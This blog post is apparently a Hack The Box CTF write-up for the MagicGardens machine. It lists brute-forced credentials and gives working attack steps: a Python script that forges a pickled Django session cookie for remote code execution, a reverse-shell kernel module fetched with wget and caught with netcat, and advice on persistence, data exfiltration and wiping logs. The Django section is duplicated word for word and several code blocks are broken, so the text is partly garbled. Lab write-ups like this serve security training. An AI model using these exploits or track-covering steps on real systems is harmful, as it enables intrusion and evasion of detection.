---
layout: post
title: "MagicGardens.htb: A Comprehensive Writeup"
date: 2024-08-30
categories: [HTB, MagicGardens, CTF]
---


# MagicGardens.htb: A Comprehensive Writeup

In this post, we'll walk through the steps to gain user and root access on the MagicGardens.htb machine. This writeup is detailed, covering all essential steps with clear explanations and commands.

## Step 1: Finding the Credentials

When purchasing an item with a subscription role, you receive a message from Morty asking for a QR code. By brute-forcing the site using Hydra with the `rockyou.txt` wordlist, you can discover Morty's credentials. These credentials can then be used to SSH into the box.

**Discovered Credentials:**

- **alex:** `diamonds`
- **morty:** `jonasbrothers`

## Step 2: Accessing the Docker Registry

After inspecting `/etc/passwd`, you can brute-force the basic authentication for the Docker registry located at `https://IP:5000/v2/_catalog`. Using the credentials `alex:diamonds`, you can authenticate successfully.

To list available tags, use the following command:

```bash
$ curl https://alex:diamonds@BOX_IP:5000/v2/magicgardens.htb/tags/list -k
{"name":"magicgardens.htb","tags":["1.3"]}
## Step 3: Configuring Docker to Access the Image

To allow Docker to pull images from the target's insecure registry, you'll need to update your Docker configuration. This involves adding the target's IP address to the list of insecure registries in the Docker daemon configuration.

1. Open the Docker daemon configuration file `/etc/docker/daemon.json` using your preferred text editor:

    ```bash
    sudo nano /etc/docker/daemon.json
    ```

2. Add the following entry to the file:

    ```json
    {
      "insecure-registries" : ["BOX_IP:5000"]
    }
    ```

   Replace `BOX_IP` with the actual IP address of the target.

3. Save the file and restart the Docker daemon to apply the changes:

    ```bash
    sudo systemctl restart docker
    ```

4. Now, you can pull the Docker image from the target’s registry using the following command:

    ```bash
    sudo docker pull BOX_IP:5000/magicgardens.htb:1.3
    ```

5. Once the image is pulled, you can run it using:

    ```bash
    sudo docker run -it BOX_IP:5000/magicgardens.htb:1.3 /bin/bash
    ```

This will start a bash session inside the Docker container, allowing you to explore and exploit the environment further.
## Step 4: Exploiting Django for Remote Code Execution (RCE)

With access to the Docker container, you can exploit a vulnerability in the Django application running on the box to achieve remote code execution (RCE). The Django application uses a secret key for cryptographic signing, which can be leveraged to create a malicious session cookie that executes arbitrary commands on the server.

### Generating a Malicious Cookie

The following Python script demonstrates how to generate a malicious session cookie:

```python
import os
import django
from django.conf import settings
import django.core.signing
import pickle

# Configure Django settings with the discovered SECRET_KEY
settings.configure(
    SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b',
)

django.setup()

# Define the salt and a serializer to use with signing
salt = "django.contrib.sessions.backends.signed_cookies"

class PickleSerializer:
    def dumps(self, obj):
        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)

    def loads(self, data):
        return pickle.loads(data)

# Create a command that executes a reverse shell
class Command:
    def __reduce__(self):
        return (os.system, ('your reverse shell command',))

# Generate the malicious cookie
cookie = django.core.signing.dumps(
    Command(), key=settings.SECRET_KEY, salt=salt, serializer=PickleSerializer
)
print(cookie)
## Step 4: Exploiting Django for Remote Code Execution (RCE)

With access to the Docker container, you can exploit a vulnerability in the Django application running on the box to achieve remote code execution (RCE). The Django application uses a secret key for cryptographic signing, which can be leveraged to create a malicious session cookie that executes arbitrary commands on the server.

### Generating a Malicious Cookie

The following Python script demonstrates how to generate a malicious session cookie:

```python
import os
import django
from django.conf import settings
import django.core.signing
import pickle

# Configure Django settings with the discovered SECRET_KEY
settings.configure(
    SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b',
)

django.setup()

# Define the salt and a serializer to use with signing
salt = "django.contrib.sessions.backends.signed_cookies"

class PickleSerializer:
    def dumps(self, obj):
        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)

    def loads(self, data):
        return pickle.loads(data)

# Create a command that executes a reverse shell
class Command:
    def __reduce__(self):
        return (os.system, ('your reverse shell command',))

# Generate the malicious cookie
cookie = django.core.signing.dumps(
    Command(), key=settings.SECRET_KEY, salt=salt, serializer=PickleSerializer
)
print(cookie)
### Steps to Execute the Exploit

1. **Replace** `'your reverse shell command'` in the script with the command you want to execute on the server, such as initiating a reverse shell.

2. **Run** the script using Python 3:

    ```bash
    python3 script.py
    ```

3. **Copy** the generated cookie and set it as the `sessionid` in your browser’s cookies.

4. **Visit** `http://magicgardens.htb/admin/` to trigger the payload and execute the command on the server.

This technique allows you to gain control over the server by exploiting the Django application’s session handling mechanism.
## Step 5: Privilege Escalation with Linux Capabilities

After gaining initial access through the Django exploit, it's time to escalate privileges. Running the `linpeas` tool reveals that the system has `CAP_SYS_MODULE` capabilities, which allow you to load and unload kernel modules. This capability can be exploited to load a custom kernel module, effectively giving you root access.

### Steps to Escalate Privileges

1. **SSH into the Box**: Use Morty's credentials to SSH into the box:

    ```bash
    ssh morty@magicgardens.htb
    password: jonasbrothers
    ```

2. **Download and Compile a Reverse Shell Kernel Module**:
   
   - Download the necessary files to create a reverse shell kernel module:

     ```bash
     morty@magicgardens:~$ wget http://IP/reverse-shell.c; wget http://IP/Makefile
     ```

   - Compile the kernel module:

     ```bash
     morty@magicgardens:~$ make
     make -C /lib/modules/6.1.0-20-amd64/build M=/home/morty modules
     ```

     This command compiles the `reverse-shell.c` file into a kernel module named `reverse-shell.ko`.

3. **Start a Listener on Your Local Machine**:
   
   - Before loading the kernel module, start a Netcat listener on your local machine to catch the reverse shell:

     ```bash
     nc -vlnp 4444
     ```

4. **Load the Compiled Kernel Module**:
   
   - Load the kernel module in the container to gain root access:

     ```bash
     insmod reverse-shell.ko
     ```

   Once the module is loaded, you should receive a reverse shell connection on your local machine, granting you root access.

### Post-Exploitation

With root access, you can fully control the target machine. Consider performing the following actions:

- **Extract Sensitive Files**: Download and review sensitive files such as `/etc/shadow` and `/root/.ssh/authorized_keys`.
- **Create Persistence**: Add your SSH key to the root's authorized keys to maintain access.
- **Clean Up**: Remove any traces of your activity, including log files and compiled kernel modules.

This method demonstrates how to leverage Linux capabilities for privilege escalation effectively, gaining root access on the target system.
## Step 6: Gaining Root Access

After successfully escalating privileges in the previous step, the final task is to gain root access and ensure persistent control over the target machine.

### Steps to Gain Root Access

1. **SSH into the Box as Root**:
   
   If you've successfully executed the reverse shell, you should already have root access. However, you can also SSH directly into the box as root using the private key provided.

   ```bash
   ssh -i root.key root@magicgardens.htb

**Replace** `root.key` with the path to the private key file you obtained during the exploitation process.

### Verify Root Access:

Once logged in, verify that you have root access by checking the user ID:

```bash
id
The output should show `uid=0(root)` indicating that you are logged in as the root user.

### Post-Exploitation Activities

With root access, you have full control over the system. Here are some key activities you might consider:

- **Explore the File System**: Look for sensitive files in `/root/` or other restricted directories.

- **Create Persistence**: To maintain access, you can add your SSH key to the root's authorized keys:

    ```bash
    echo "your-ssh-public-key" >> /root/.ssh/authorized_keys
    ```

- **Exfiltrate Data**: If needed, download important files from the target machine to your local system for analysis.

- **Cover Your Tracks**: It's crucial to clean up any logs or artifacts that could reveal your activities. This includes removing log entries, clearing history, and deleting any files you uploaded.
